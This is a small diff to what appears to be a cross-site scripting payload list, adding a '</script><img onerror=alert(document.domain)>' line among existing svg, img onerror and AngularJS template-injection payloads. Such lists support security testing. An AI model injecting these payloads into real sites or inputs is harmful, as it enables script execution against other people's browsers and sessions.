@@ -126,6 +126,7 @@ ${alert(1)}
 <svg><animatetransform%20§§=1>
 <><img src=1 onerror=alert(1)>
 \"-alert(1)}//
+</script><img src=1 onerror=alert(document.domain)>
 
 //angular
 {{$on.constructor('alert(1)')()}}
